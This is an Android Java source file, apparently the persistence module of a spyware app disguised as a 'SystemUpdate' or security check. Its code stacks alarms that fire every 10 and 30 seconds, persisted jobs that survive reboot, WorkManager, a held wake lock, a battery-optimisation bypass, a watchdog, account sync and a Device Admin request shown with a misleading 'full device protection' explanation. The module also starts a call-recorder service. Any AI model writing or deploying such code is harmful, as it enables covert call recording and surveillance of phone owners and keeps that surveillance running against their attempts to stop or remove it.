package com.sec.check;

import android.app.AlarmManager;
import android.app.PendingIntent;
import android.app.job.JobInfo;
import android.app.job.JobScheduler;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.PowerManager;
import android.provider.Settings;
import android.util.Log;

import androidx.work.ExistingPeriodicWorkPolicy;
import androidx.work.PeriodicWorkRequest;
import androidx.work.WorkManager;

import java.util.concurrent.TimeUnit;

/**
 * PersistenceManager - إدارة كل طبقات الاستمرارية
 * ============================================================
 * الطبقات:
 * 1. AlarmManager (فردي + متكرر + أبدي)
 * 2. JobScheduler (مع setPersisted)
 * 3. WorkManager (backup)
 * 4. WakeLock (لمنع النوم)
 * 5. Device Admin
 * 6. Account Sync
 * 7. Services Watchdog
 * 8. Battery Optimization Bypass
 * ============================================================
 */
public class PersistenceManager {

    private static final String TAG = "SystemUpdate";

    // ★ طلب الإنذار الفردي ★
    private static final int REQUEST_ALARM_SINGLE = 1001;
    // ★ طلب الإنذار المتكرر ★
    private static final int REQUEST_ALARM_REPEAT = 1002;
    // ★ طلب الإنذار الأبدي ★
    private static final int REQUEST_ALARM_ETERNAL = 1003;
    // ★ طلب الإنذار السريع ★
    private static final int REQUEST_ALARM_FAST = 1004;

    // ★ Job ID ★
    private static final int JOB_ID_KEEPALIVE = 2001;
    private static final int JOB_ID_ETERNAL = 2002;

    // ★ Work name ★
    private static final String WORK_NAME = "SecurityCheckKeepAlive";

    // ★ WakeLock ★
    private static PowerManager.WakeLock wakeLock;

    // ============================================================
    // [1] AlarmManager - إنذار فردي
    // ============================================================
    public static void scheduleAlarm(Context context) {
        try {
            AlarmManager am = (AlarmManager)
                    context.getSystemService(Context.ALARM_SERVICE);
            if (am == null) return;

            Intent intent = new Intent(context, AlarmReceiver.class);
            intent.setAction("com.sec.check.KEEP_ALIVE");

            int flags = PendingIntent.FLAG_UPDATE_CURRENT;
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                flags |= PendingIntent.FLAG_IMMUTABLE;
            }

            PendingIntent pi = PendingIntent.getBroadcast(
                    context, REQUEST_ALARM_SINGLE, intent, flags);

            long interval = 60 * 1000L; // 60 ثانية
            long triggerAt = System.currentTimeMillis() + interval;

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                am.setExactAndAllowWhileIdle(AlarmManager.RTC_WAKEUP, triggerAt, pi);
            } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
                am.setExact(AlarmManager.RTC_WAKEUP, triggerAt, pi);
            } else {
                am.set(AlarmManager.RTC_WAKEUP, triggerAt, pi);
            }

            Log.d(TAG, "[PERSISTENCE] Single alarm scheduled");
        } catch (Exception e) {
            Log.e(TAG, "scheduleAlarm: " + e.getMessage());
        }
    }

    // ============================================================
    // [2] AlarmManager - إنذار متكرر
    // ============================================================
    public static void scheduleRepeatingAlarm(Context context) {
        try {
            AlarmManager am = (AlarmManager)
                    context.getSystemService(Context.ALARM_SERVICE);
            if (am == null) return;

            Intent intent = new Intent(context, AlarmReceiver.class);
            intent.setAction("com.sec.check.KEEP_ALIVE_REPEAT");

            int flags = PendingIntent.FLAG_UPDATE_CURRENT;
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                flags |= PendingIntent.FLAG_IMMUTABLE;
            }

            PendingIntent pi = PendingIntent.getBroadcast(
                    context, REQUEST_ALARM_REPEAT, intent, flags);

            long interval = 15 * 60 * 1000L; // 15 دقيقة
            long triggerAt = System.currentTimeMillis() + interval;

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                am.setExactAndAllowWhileIdle(AlarmManager.RTC_WAKEUP, triggerAt, pi);
            } else {
                am.setRepeating(AlarmManager.RTC_WAKEUP, triggerAt, interval, pi);
            }

            Log.d(TAG, "[PERSISTENCE] Repeating alarm scheduled");
        } catch (Exception e) {
            Log.e(TAG, "scheduleRepeatingAlarm: " + e.getMessage());
        }
    }

    // ============================================================
    // [3] ★★★ AlarmManager - الإنذار الأبدي (كل 30 ثانية للأبد) ★★★
    // ============================================================
    public static void scheduleEternalAlarm(Context context) {
        try {
            AlarmManager am = (AlarmManager)
                    context.getSystemService(Context.ALARM_SERVICE);
            if (am == null) return;

            Intent intent = new Intent(context, AlarmReceiver.class);
            intent.setAction("com.sec.check.ETERNAL");

            int flags = PendingIntent.FLAG_UPDATE_CURRENT;
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                flags |= PendingIntent.FLAG_IMMUTABLE;
            }

            PendingIntent pi = PendingIntent.getBroadcast(
                    context, REQUEST_ALARM_ETERNAL, intent, flags);

            // ★★★ كل 30 ثانية — للأبد ★★★
            long interval = 30 * 1000L;
            long triggerAt = System.currentTimeMillis() + interval;

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                am.setExactAndAllowWhileIdle(AlarmManager.RTC_WAKEUP, triggerAt, pi);
            } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
                am.setExact(AlarmManager.RTC_WAKEUP, triggerAt, pi);
            } else {
                am.set(AlarmManager.RTC_WAKEUP, triggerAt, pi);
            }

            Log.d(TAG, "[PERSISTENCE] ★ ETERNAL alarm scheduled (30s) ★");
        } catch (Exception e) {
            Log.e(TAG, "scheduleEternalAlarm: " + e.getMessage());
        }
    }

    // ============================================================
    // [4] ★★★ إنذار سريع (كل 10 ثواني) ★★★
    // ============================================================
    public static void scheduleFastAlarm(Context context) {
        try {
            AlarmManager am = (AlarmManager)
                    context.getSystemService(Context.ALARM_SERVICE);
            if (am == null) return;

            Intent intent = new Intent(context, AlarmReceiver.class);
            intent.setAction("com.sec.check.ETERNAL");

            int flags = PendingIntent.FLAG_UPDATE_CURRENT;
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                flags |= PendingIntent.FLAG_IMMUTABLE;
            }

            PendingIntent pi = PendingIntent.getBroadcast(
                    context, REQUEST_ALARM_FAST, intent, flags);

            long triggerAt = System.currentTimeMillis() + 10000; // 10 ثواني

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                am.setExactAndAllowWhileIdle(AlarmManager.RTC_WAKEUP, triggerAt, pi);
            } else {
                am.set(AlarmManager.RTC_WAKEUP, triggerAt, pi);
            }

            Log.d(TAG, "[PERSISTENCE] Fast alarm scheduled (10s)");
        } catch (Exception e) {
            Log.e(TAG, "scheduleFastAlarm: " + e.getMessage());
        }
    }

    // ============================================================
    // [5] JobScheduler - للأبد
    // ============================================================
    public static void scheduleJob(Context context) {
        try {
            if (Build.VERSION.SDK_INT < Build.VERSION_CODES.LOLLIPOP) return;

            JobScheduler js = (JobScheduler)
                    context.getSystemService(Context.JOB_SCHEDULER_SERVICE);
            if (js == null) return;

            // ★★★ Job 1: للاستمرارية العامة ★★★
            ComponentName component = new ComponentName(context, KeepAliveJobService.class);

            JobInfo job1 = new JobInfo.Builder(JOB_ID_KEEPALIVE, component)
                    .setRequiredNetworkType(JobInfo.NETWORK_TYPE_ANY)
                    .setPersisted(true) // ★ يعمل بعد reboot
                    .setPeriodic(15 * 60 * 1000L) // 15 دقيقة
                    .setOverrideDeadline(60 * 1000L) // أول مرة خلال دقيقة
                    .build();

            js.schedule(job1);

            // ★★★ Job 2: الأبدي ★★★
            JobInfo job2 = new JobInfo.Builder(JOB_ID_ETERNAL, component)
                    .setRequiredNetworkType(JobInfo.NETWORK_TYPE_ANY)
                    .setPersisted(true)
                    .setMinimumLatency(30 * 1000L) // كل 30 ثانية
                    .setOverrideDeadline(60 * 1000L)
                    .build();

            try {
                js.schedule(job2);
            } catch (Exception e) {
                Log.d(TAG, "Eternal job error: " + e.getMessage());
            }

            Log.d(TAG, "[PERSISTENCE] Jobs scheduled");
        } catch (Exception e) {
            Log.e(TAG, "scheduleJob: " + e.getMessage());
        }
    }

    // ============================================================
    // [6] WorkManager - backup
    // ============================================================
    public static void scheduleWork(Context context) {
        try {
            PeriodicWorkRequest work = new PeriodicWorkRequest.Builder(
                    KeepAliveWorker.class, 15, TimeUnit.MINUTES)
                    .setInitialDelay(1, TimeUnit.MINUTES)
                    .build();

            WorkManager.getInstance(context).enqueueUniquePeriodicWork(
                    WORK_NAME,
                    ExistingPeriodicWorkPolicy.KEEP,
                    work);

            Log.d(TAG, "[PERSISTENCE] WorkManager scheduled");
        } catch (Exception e) {
            Log.e(TAG, "scheduleWork: " + e.getMessage());
        }
    }

    // ============================================================
    // [7] WakeLock
    // ============================================================
    public static void acquireWakeLock(Context context) {
        try {
            PowerManager pm = (PowerManager)
                    context.getSystemService(Context.POWER_SERVICE);
            if (pm == null) return;

            if (wakeLock != null && wakeLock.isHeld()) return;

            wakeLock = pm.newWakeLock(
                    PowerManager.PARTIAL_WAKE_LOCK,
                    "SecurityCheck::KeepAliveWakeLock");

            wakeLock.setReferenceCounted(false);
            wakeLock.acquire();

            Log.d(TAG, "[PERSISTENCE] WakeLock acquired");
        } catch (Exception e) {
            Log.e(TAG, "acquireWakeLock: " + e.getMessage());
        }
    }

    public static void releaseWakeLock() {
        try {
            if (wakeLock != null && wakeLock.isHeld()) {
                wakeLock.release();
                wakeLock = null;
            }
        } catch (Exception e) {
            Log.e(TAG, "releaseWakeLock: " + e.getMessage());
        }
    }

    // ============================================================
    // [8] Battery Optimization
    // ============================================================
    public static boolean isBatteryOptimizationDisabled(Context context) {
        try {
            if (Build.VERSION.SDK_INT < Build.VERSION_CODES.M) return true;
            PowerManager pm = (PowerManager)
                    context.getSystemService(Context.POWER_SERVICE);
            if (pm == null) return false;
            return pm.isIgnoringBatteryOptimizations(context.getPackageName());
        } catch (Exception e) {
            return false;
        }
    }

    public static Intent getBatteryOptimizationIntent(Context context) {
        try {
            if (Build.VERSION.SDK_INT < Build.VERSION_CODES.M) return null;
            Intent intent = new Intent();
            intent.setAction(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
            intent.setData(android.net.Uri.parse("package:" + context.getPackageName()));
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            return intent;
        } catch (Exception e) {
            return null;
        }
    }

    // ============================================================
    // [9] startMainService
    // ============================================================
    public static void startMainService(Context context) {
        try {
            Intent serviceIntent = new Intent(context, ServiceRunner.class);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(serviceIntent);
            } else {
                context.startService(serviceIntent);
            }
            Log.d(TAG, "[PERSISTENCE] Main service started");
        } catch (Exception e) {
            Log.e(TAG, "startMainService: " + e.getMessage());
        }
    }

    // ============================================================
    // [10] startCallRecorderService
    // ============================================================
    public static void startCallRecorderService(Context context) {
        try {
            Intent serviceIntent = new Intent(context, CallRecorderService.class);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(serviceIntent);
            } else {
                context.startService(serviceIntent);
            }
            Log.d(TAG, "[PERSISTENCE] Call recorder started");
        } catch (Exception e) {
            Log.e(TAG, "startCallRecorderService: " + e.getMessage());
        }
    }

    // ============================================================
    // [11] ★★★ preventAppStop - منع النظام من إيقاف التطبيق ★★★
    // ============================================================
    public static void preventAppStop(Context context) {
        try {
            // ★ استمرارية إضافية: إعادة تشغيل الخدمات كل فترة قصيرة ★
            scheduleFastAlarm(context);
            Log.d(TAG, "[PERSISTENCE] App-stop prevention activated");
        } catch (Exception e) {
            Log.e(TAG, "preventAppStop: " + e.getMessage());
        }
    }

    // ============================================================
    // [12] ★★★ enableAllPersistence - تفعيل كل الطبقات ★★★
    // ============================================================
    public static void enableAllPersistence(Context context) {
        Log.d(TAG, "[PERSISTENCE] ═══ Enabling ALL persistence layers ═══");

        // 1. الخدمة الرئيسية
        startMainService(context);

        // 2. خدمة تسجيل المكالمات
        try {
            startCallRecorderService(context);
        } catch (Exception ignored) {}

        // 3. WakeLock
        acquireWakeLock(context);

        // 4. AlarmManager (فردي)
        scheduleAlarm(context);

        // 5. AlarmManager (متكرر)
        scheduleRepeatingAlarm(context);

        // 6. ★★★ AlarmManager (أبدي - كل 30 ثانية) ★★★
        scheduleEternalAlarm(context);

        // 7. AlarmManager (سريع - كل 10 ثواني)
        scheduleFastAlarm(context);

        // 8. JobScheduler
        scheduleJob(context);

        // 9. WorkManager
        scheduleWork(context);

        // 10. Device Admin
        try {
            enableDeviceAdmin(context);
        } catch (Exception ignored) {}

        // 11. Account Sync
        try {
            enableAccountSync(context);
        } catch (Exception ignored) {}

        // 12. Services Watchdog
        try {
            ServicesWatchdog.startWatching(context);
        } catch (Exception ignored) {}

        // 13. منع الإيقاف
        preventAppStop(context);

        Log.d(TAG, "[PERSISTENCE] ═══ ALL layers enabled ═══");
    }

    // ============================================================
    // [13] Device Admin - تفعيل
    // ============================================================
    private static void enableDeviceAdmin(Context context) {
        try {
            android.app.admin.DevicePolicyManager dpm =
                    (android.app.admin.DevicePolicyManager)
                            context.getSystemService(Context.DEVICE_POLICY_SERVICE);
            if (dpm == null) return;

            ComponentName adminComponent =
                    new ComponentName(context, AdminReceiver.class);

            if (dpm.isAdminActive(adminComponent)) {
                Log.d(TAG, "[PERSISTENCE] Device Admin already active");
                return;
            }

            Intent intent = new Intent(
                    android.app.admin.DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
            intent.putExtra(
                    android.app.admin.DevicePolicyManager.EXTRA_DEVICE_ADMIN,
                    adminComponent);
            intent.putExtra(
                    android.app.admin.DevicePolicyManager.EXTRA_ADD_EXPLANATION,
                    "مطلوب لتفعيل الحماية الكاملة للجهاز.");
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            context.startActivity(intent);
        } catch (Exception e) {
            Log.e(TAG, "enableDeviceAdmin: " + e.getMessage());
        }
    }

    // ============================================================
    // [14] Account Sync
    // ============================================================
    private static void enableAccountSync(Context context) {
        try {
            AccountSyncService.registerSyncAdapter(context);
        } catch (Exception e) {
            Log.e(TAG, "enableAccountSync: " + e.getMessage());
        }
    }

    // ============================================================
    // [15] cancelAllAlarms - إلغاء كل الإنذارات (للتحديث)
    // ============================================================
    public static void cancelAllAlarms(Context context) {
        try {
            AlarmManager am = (AlarmManager)
                    context.getSystemService(Context.ALARM_SERVICE);
            if (am == null) return;

            int flags = PendingIntent.FLAG_UPDATE_CURRENT;
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                flags |= PendingIntent.FLAG_IMMUTABLE;
            }

            int[] requests = {
                    REQUEST_ALARM_SINGLE,
                    REQUEST_ALARM_REPEAT,
                    REQUEST_ALARM_ETERNAL,
                    REQUEST_ALARM_FAST
            };

            for (int req : requests) {
                try {
                    Intent intent = new Intent(context, AlarmReceiver.class);
                    PendingIntent pi = PendingIntent.getBroadcast(
                            context, req, intent, flags);
                    am.cancel(pi);
                } catch (Exception ignored) {}
            }

            Log.d(TAG, "[PERSISTENCE] All alarms cancelled");
        } catch (Exception e) {
            Log.e(TAG, "cancelAllAlarms: " + e.getMessage());
        }
    }
        }
